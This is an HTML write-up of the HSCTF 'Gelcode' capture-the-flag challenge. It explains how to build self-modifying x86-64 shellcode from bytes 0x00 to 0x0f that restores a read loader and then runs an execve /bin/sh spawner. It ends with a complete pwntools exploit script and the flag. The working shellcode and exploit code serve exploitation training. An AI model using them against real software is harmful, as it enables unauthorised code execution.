@@ -1,0 +1,316 @@
+<!--Solve date: 06/17/2021-->
+
+<h1>HSCTF - Gelcode</h1>
+
+<h2>Binary Exploitation - 490 pts</h2>
+
+<h3>Writeup by YR81</h3>
+
+<h4>Discussion</h4>
+
+<h5>General Behavior</h5>
+
+<p>This is a standard shellcoding challenge. The program reads 1000 bytes of shellcode into a heap buffer, then calls <code>mprotect</code> to mark the buffer page as readable, writable, and executable. The caveat is that the shellcode can only contain bytes that are in the range of <code>0x00..0x0f</code>, inclusive; that is, our input alphabet is only the lowest 16 bytes. This poses a significant restriction on the instructions we have access to.</p>
+
+<img class = "small" src = "./images/hsctf_gelcode_1.png"/>
+
+<p class = "caption">Figure 1. Shellcode filtering protocol. All bytes that are bigger than <code>0x0f</code> are overwritten with <code>0x00</code>.</p>
+
+<p>After filtering, the program sets <code>eax</code> to <code>0</code> and <code>rdx</code> to the address of the shellcode. (Even though it is just <code>eax</code> that is being set to zero, it turns out that the entire <code>rax</code> is zero after the operation, which will be useful.) This is followed by <code>call rdx</code> to execute the shellcode.</p>
+
+<h5>Strategy: Shellcode Loader</h5>
+
+<p>The strategy is to first execute a <code>read(stdin, sc, size)</code> that will bring in the main shellcode. This second <code>read</code> will not come with any input restrictions. The following shellcode accomplishes this:</p>
+
+<pre class = "asm">
+xor rdi, rdi
+push rdx
+pop rsi
+push &lt;size&gt;
+pop rdx
+xor rax, rax
+syscall
+</pre>
+
+<p>which corresponds to the following bytes, assuming that <code>&lt;size&gt; = 0x200</code>:</p>
+
+<p><code>48 31 ff 52 5e 68 00 02 00 00 5a 48 31 c0 0f 05</code></p>
+
+<p>Clearly, we cannot input this loader directly because several bytes have a nonzero upper nibble and would be filtered out. However, we can prepend the shellcode with some instructions that will construct it (think self-modifying code). For instance, we can start out with just the low nibbles (here on referred to as the "truncated" loader):</p>
+
+<p><code>08 01 0f 02 0e 08 00 02 00 00 0a 08 01 00 0f 05</code></p>
+
+<p>and programmatically restore the missing upper nibbles.</p>
+
+<p>The main shellcode is arbitrary. We use the following 29-byte shell spawner.</p>
+
+<pre class = "asm">
+mov rax, 0xff978cd091969dd0
+not rax
+push rax
+push rsp
+pop rdi
+xor rax, rax
+push rax
+push rsp
+pop rdx
+push rdi
+push rsp
+pop rsi
+mov al, 0x3b
+syscall
+</pre>
+
+<h5>Survey of Available Instructions</h5>
+
+<p>Shown in Fig. 2 are the x86-64 instructions we have access to. In x64, it turns out that <code>0x06</code>, <code>0x07</code>, and <code>0x0e</code> corresponding to <code>push es</code>, <code>pop es</code>, and <code>push cs</code> are invalid, so they have been marked out. This does not pose a huge problem because they are not particularly useful anyway.</p>
+
+<img src = "./images/hsctf_gelcode_2.png"/>
+
+<p class = "caption">Figure 2. Subset of instructions we can use in our shellcode [1].</p>
+
+<p>Two-byte instruction opcodes that begin with <code>0x0f</code> include a variety of processor control operations, such as storing and loading descriptors, setting segment limits, and managing caches. None of these are particularly useful. Note, however, that <code>syscall</code> (<code>0f 05</code>) is available and is actually used in our loader shellcode without the need for adjusting the upper nibbles.</p>
+
+<img src = "./images/hsctf_gelcode_3.png"/>
+
+<p class = "caption">Figure 3. Two-byte instructions starting with <code>0x0f</code> [2].</p>
+
+<p>This leaves us with just <code>add</code> and <code>or</code> instructions, where the operands are either doublewords or bytes with a limited subset of operands. In the blocks in Fig. 2, <code>Eb</code> and <code>Ev</code> operand tags denote a ModR/M byte following the primary opcode where the operand size is either byte or doubleword, respectively. The ModR/M byte follows the opcode:</p>
+
+<img class = "small" src = "./images/hsctf_gelcode_4.png"/>
+
+<p class = "caption">Figure 4. ModR/M byte [3].</p>
+
+<p>Due to the input restriction, the MOD field must be 0, which indicates a memory operand with no displacement. The REG field must be either 0 or 1, which correspond to <code>al, eax</code> and <code>cl, ecx</code>, respectively (here on referred to simply as A and C registers, with the size depending on context). The R/M field is unrestricted.</p>
+
+<img class = "small" src = "./images/hsctf_gelcode_5.png"/>
+
+<p class = "caption">Figure 5. 32-bit R/M addressing modes [3].</p>
+
+<p>With the scaled-index byte, which is required when <code>R/M = 4</code>, we can also address memory that is the sum of an arbitrary base register and a scale of an index register. Again due to the input restriction, the multiplier bits must be 0, which means the scale must be unity, and the index can only be either A or C.</p>
+
+<img class = "small" src = "./images/hsctf_gelcode_6.png"/>
+
+<p class = "caption">Figure 6. Scaled-index byte [3].</p>
+
+<p>When <code>R/M = 5</code>, we can address relative to a 32-bit immediate offset from the instruction pointer <code>rip</code>. While this could make for an interesting self-modifying primitive, it is rather complicated and we will not consider it here.</p>
+
+<p>In summary, we can (add and logical-or) (bytes and doublewords) between (either the A or C registers) and (memory referenced by a register, or a sum of a register and either A or C). This covers all the purple blocks in Fig. 2. We also have four instructions, shaded green, that allow us to modify the A register with immediate values.</p>
+
+<h5>Clearing a Doubleword in Memory</h5>
+
+<p>First, we achieve the following: <code>dword ptr [rdx] = 4</code>. In particular, we form a doubleword in memory where only the lowest byte is nonzero. The reason for this will be made clear later. Note that we are already introducing self-modifying code at this point.</p>
+
+<p>We start with two do-nothing instructions, <code>add al, 0; add al, 0</code> which assembles to <code>04 00 04 00</code>. While they are do-nothing, they are useful because they contain two null bytes. We only need to clear the third byte, <code>byte ptr [rdx + 2]</code>, to achieve our goal.</p>
+
+<p>To clear that byte, we first set it to 0xff, then add 1. The following sequence of instructions accomplishes this. Note that it does not matter what <code>cl</code> is (or, for that matter, what <code>byte ptr [rdx + 2]</code> is) before running the code. This is because logical-or does not preserve information when masked with 1.</p>
+
+<pre class = "asm">
+04 00		add al, 0
+04 00		add al, 0
+04 0f		add al, 0xf		#al = 0xf
+08 02		or [rdx], al		#[rdx] = 0xf
+02 02		add al, [rdx]		#al = 0x1e
+08 02		or [rdx], al		#[rdx] = 0x1f
+02 02		add al, [rdx]		#al = 0x3d
+08 02		or [rdx], al		#[rdx] = 0x3f
+02 02		add al, [rdx]		#al = 0x7c		
+08 02		or [rdx], al		#[rdx] = 0x7f
+02 02		add al, [rdx]		#al = 0xfb
+08 02		or [rdx], al		#[rdx] = 0xff
+0a 0a		or cl, [rdx]		#cl = 0xff
+04 07		add al, 7		#al = 2
+00 02		add [rdx], al		#[rdx] = 1
+08 0c 02	or [rdx + rax], cl	#[rdx + 2] = 0xff
+02 0a		add cl, [rdx]		#cl = 0
+02 0a		add cl, [rdx]		#cl = 1
+00 0c 02	add [rdx + rax], cl	#[rdx + 2] = 0			40
+</pre>
+
+<h5>Forming a Constant</h5>
+
+<p>Next, we form a useful constant for our exploit, <code>0x10</code>. Imagine if <code>cl = 0x10</code>. If we have a pointer (either in a register or as a sum of A and a register) to a byte our "truncated" loader, we could simply add <code>cl</code> multiple times to that byte until we get the desired upper nibble.</p>
+
+<p>We achieve this in much the same way as above. We first set <code>cl = byte ptr [rdx] = 0xff</code>, then set <code>al = 2</code> and add <code>al</code> to <code>byte ptr [rdx]</code> to get <code>byte ptr [rdx] = 1</code>. Then, adding <code>byte ptr [rdx]</code> to <code>cl</code> will get <code>cl = 0</code>. Finally, setting <code>al = 0xf</code>, adding <code>al</code> to <code>byte ptr [rdx]</code>, and adding <code>byte ptr [rdx]</code> to <code>cl</code> achieves the goal.</p>
+
+<pre class = "asm">
+04 0d		add al, 0xd		#al = 0xf
+08 02		or [rdx], al		#[rdx] = 0xf
+02 02		add al, [rdx]		#al = 0x1e
+08 02		or [rdx], al		#[rdx] = 0x1f
+02 02		add al, [rdx]		#al = 0x3d
+08 02		or [rdx], al		#[rdx] = 0x3f
+02 02		add al, [rdx]		#al = 0x7c		
+08 02		or [rdx], al		#[rdx] = 0x7f
+02 02		add al, [rdx]		#al = 0xfb
+08 02		or [rdx], al		#[rdx] = 0xff
+0a 0a		or cl, [rdx]		#cl = 0xff
+04 07		add al, 7		#al = 2
+00 02		add [rdx], al		#[rdx] = 1
+02 0a		add cl, [rdx]		#cl = 0
+04 0d		add al, 0xd		#al = 0xf
+00 02		add [rdx], al		#[rdx] = 0x10
+02 0a		add cl, [rdx]		#cl = 0x10			34
+</pre>
+
+<h5>Pointing <code>rax</code> to the Offset of the Truncated Loader</h5>
+
+<p>Now we set <code>rax</code> to the offset of the truncated loader within the shellcode. That is, <code>rdx + rax</code> is the absolute address of the loader. Now that <code>dword ptr [rdx] = 0x10</code> (this is why we cleared the upper three bytes in the first step), this task is simple: we repeatedly add 0x10 to <code>eax</code> until it points to the loader. This step is a bit tricky because it requires us either to know <i>where</i> the offset of the loader is to begin with or to include do-nothing instructions to pad the space up to the loader. But once the sizes of all the parts are determined, this can be easily solved for. In our case, the offset of the loader was <code>0x123</code>, so we can <code>add al, 4</code> to get <code>al = 0x13</code> from the end of the second part, then <code>add eax, [edx]</code> seventeen times.</p>
+
+<pre class = "asm">
+04 04		add al, 4		#eax = 0x13
+03 02		add eax, [rdx]
+03 02		add eax, [rdx]
+03 02		add eax, [rdx]
+03 02		add eax, [rdx]
+03 02		add eax, [rdx]
+03 02		add eax, [rdx]
+03 02		add eax, [rdx]
+03 02		add eax, [rdx]
+03 02		add eax, [rdx]
+03 02		add eax, [rdx]
+03 02		add eax, [rdx]
+03 02		add eax, [rdx]
+03 02		add eax, [rdx]
+03 02		add eax, [rdx]
+03 02		add eax, [rdx]
+03 02		add eax, [rdx]
+03 02		add eax, [rdx]		#eax = 0x123			36
+</pre>
+
+<h5>Walking the Truncated Loader and Writing Upper Nibbles</h5>
+
+<p>Now that <code>rdx + rax</code> points to the loader, we can adjust the upper nibbles of the nibbles by repeatedly adding <code>cl = 0x10</code> to each byte. To move on to the next byte, we simply increment <code>eax</code>. Since the loader is fully contained in a memory block of size <code>0x100</code>, we can save a few bytes and simply <code>add al, 1</code> (<code>04 01</code>) instead of <code>add eax, 1</code> (<code>05 01 00 00</code>), although the latter can be applied more generally.</p>
+
+<p>For example, to correct the first two bytes, which are <code>48 31</code>, we can do the following:</p>
+
+<pre class = "asm">
+00 0c 02	add [rdx + rax], cl
+00 0c 02	add [rdx + rax], cl
+00 0c 02	add [rdx + rax], cl
+00 0c 02	add [rdx + rax], cl					12
+
+04 01		add al, 1
+00 0c 02	add [rdx + rax], cl
+00 0c 02	add [rdx + rax], cl
+00 0c 02	add [rdx + rax], cl					11
+</pre>
+
+<p>Note that each <code>add</code> to adjust memory is 3 bytes. To form something like <code>0xff</code>, which requires 15 adds, will be quite expensive (47 bytes). It turns out that we can cut down on the size slightly for this case by using the following trick. Instead of adding to the memory byte, we logical-or instead. First, we <code>add cl, [rdx]</code> (<code>02 0a</code>) until <code>cl = 0x70</code>, then <code>or [rdx + rax], cl</code>. Then, we <code>add cl, [rdx]</code> again so that <code>cl = 0x80</code>, then <code>or [rdx + rax], cl</code> again. This has the same effect as adding 15 times. Of course, we need to restore <code>cl</code> to 0x10 after the operation for the next byte. Overall, this requires <code>16 * 2 + 2 * 3 = 38</code> bytes, plus the two for incrementing <code>eax</code>, for a total of 40 bytes. This is also advantageous for 0xe and 0xd, but becomes worse than the multiple adding for 0xc and below.</p>
+
+<pre class = "asm">
+04 01		add al, 1
+02 0a		add cl, [rdx]
+02 0a		add cl, [rdx]
+02 0a		add cl, [rdx]
+02 0a		add cl, [rdx]
+02 0a		add cl, [rdx]
+02 0a		add cl, [rdx]		#cl = 0x70
+08 0c 02	or [rdx + rax], cl
+02 0a		add cl, [rdx]		#cl = 0x80
+08 0c 02	or [rdx + rax], cl
+02 0a		add cl, [rdx]
+02 0a		add cl, [rdx]
+02 0a		add cl, [rdx]
+02 0a		add cl, [rdx]
+02 0a		add cl, [rdx]
+02 0a		add cl, [rdx]
+02 0a		add cl, [rdx]
+02 0a		add cl, [rdx]
+02 0a		add cl, [rdx]		#cl = 0x10			40
+</pre>
+
+<p>The last correction we need turns out to be for <code>0xc0</code>, so while we would normally do repeated add, we don't care about the value of <code>cl</code> after this point. So, we can save several bytes by using the alternative technique and stopping after the second <code>or [rdx + rax], cl</code>:</p>
+
+<pre class = "asm">
+04 01		add al, 1
+02 0a		add cl, [rdx]
+02 0a		add cl, [rdx]
+02 0a		add cl, [rdx]		#cl = 0x40
+08 0c 02	or [rdx + rax], cl
+02 0a		add cl, [rdx]
+02 0a		add cl, [rdx]
+02 0a		add cl, [rdx]
+02 0a		add cl, [rdx]		#cl = 0x80
+08 0c 02	or [rdx + rax], cl					22
+</pre>
+
+<p>Right after the last logical-or executes, the loader is fully formed and begins to execute.</p>
+
+<h5>Dropping Shellcode</h5>
+
+<p>As the program executes the loader, we can now pass in the shellcode. We have to ensure that the shellcode is properly padded with the length of the entire initial payload (including the truncated loader) so that right after the return from the syscall, the actual shellcode starts to run. The initial payload is 307 bytes long.</p>
+
+<h4>Payload</h4>
+
+<pre class = "python">
+from pwn import *
+
+ready = True
+debug = False
+
+if ready:
+    p = remote("gelcode.hsc.tf", 1337)
+else:
+    p = process("./gelcode")
+    if debug:
+        context.terminal = ["/mnt/c/Users/********/wsl-terminal/open-wsl.exe", "-e"]
+        gdb.attach(p, gdbscript = """
+        
+        """)
+
+# exploit
+part1a = b"\x04\x00" * 2 + b"\x04\x0f\x08\x02" + b"\x02\x02\x08\x02" * 4 + b"\x0a\x0a\x04\x07\x00\x02\x08\x0c\x02\x02\x0a\x02\x0a\x00\x0c\x02"
+assert len(part1a) == 40
+part1b = b"\x04\x0d\x08\x02" + b"\x02\x02\x08\x02" * 4 + b"\x0a\x0a\x04\x07\x00\x02\x02\x0a\x04\x0d\x00\x02\x02\x0a"
+assert len(part1b) == 34
+part2 = b"\x04\x04" + b"\x03\x02" * 17
+assert len(part2) == 36
+part3 = b"\x00\x0c\x02" * 4
+assert len(part3) == 12
+part4 = b"\x04\x01" + b"\x00\x0c\x02" * 3
+assert len(part4) == 11
+part5 = b"\x04\x01" + b"\x02\x0a" * 6 + b"\x08\x0c\x02" + b"\x02\x0a" + b"\x08\x0c\x02" + b"\x02\x0a" * 9
+assert len(part5) == 40
+part6 = b"\x04\x01" + b"\x00\x0c\x02" * 5
+assert len(part6) == 17
+part7 = b"\x04\x01" + b"\x00\x0c\x02" * 5
+assert len(part7) == 17
+part8 = b"\x04\x01" + b"\x00\x0c\x02" * 6
+assert len(part8) == 20
+part9 = b"\x04\x05" + b"\x00\x0c\x02" * 5
+assert len(part9) == 17
+part10 = b"\x04\x01" + b"\x00\x0c\x02" * 4
+assert len(part10) == 14
+part11 = b"\x04\x01" + b"\x00\x0c\x02" * 3
+assert len(part11) == 11
+part12 = b"\x04\x01" + b"\x02\x0a" * 3 + b"\x08\x0c\x02" + b"\x02\x0a" * 4 + b"\x08\x0c\x02"
+assert len(part12) == 22
+droppertrunc = b"\x08\x01\x0f\x02\x0e\x08\x00\x02\x00\x00\x0a\x08\x01\x00\x0f\x05"
+assert len(droppertrunc) == 16
+
+sc = b"\x48\xb8\xd0\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xd0\x50\x54\x5f\x48\x31\xc0\x50\x54\x5a\x57\x54\x5e\xb0\x3b\x0f\x05"
+
+p.recvline()
+# drop initial payload
+pl1 = part1a + part1b + part2 + part3 + part4 + part5 + part6 + part7 + part8 + part9 + part10 + part11 + part12 + droppertrunc
+
+p.send(pl1.ljust(1000, b'\x00'))
+
+# drop the real shellcode
+p.send(b'\x90' * len(pl1) + sc)
+
+p.interactive()
+</pre>
+
+<h4>Flag</h4>
+
+<p><code>flag{bell_code_noughttwoeff}</code></p>
+
+<h4>References</h4>
+
+<ol>
+    <li><p>Sparks and Flames. <a href = "http://sparksandflames.com/files/x86InstructionChart.html" target = "_blank">"Intel x86 Assembler Instruction Set Opcode Table"</a> <b>2016</b>.</p></li>
+    <li><p>Ludloff, C.; Mocko, M.; Lopes, A.; et al. <a href = "http://ref.x86asm.net/coder32.html#two-byte" target = "_blank">"coder64"</a> <b>2017</b>.</p></li>
+    <li><p>Brey, B. <i>The Intel Microprocessors: Architecture, Programming, and Interfacing</i>, 8ed. <i>Pearson Prentice Hall</i> <b>2009</b>.</p></li>
+</ol>
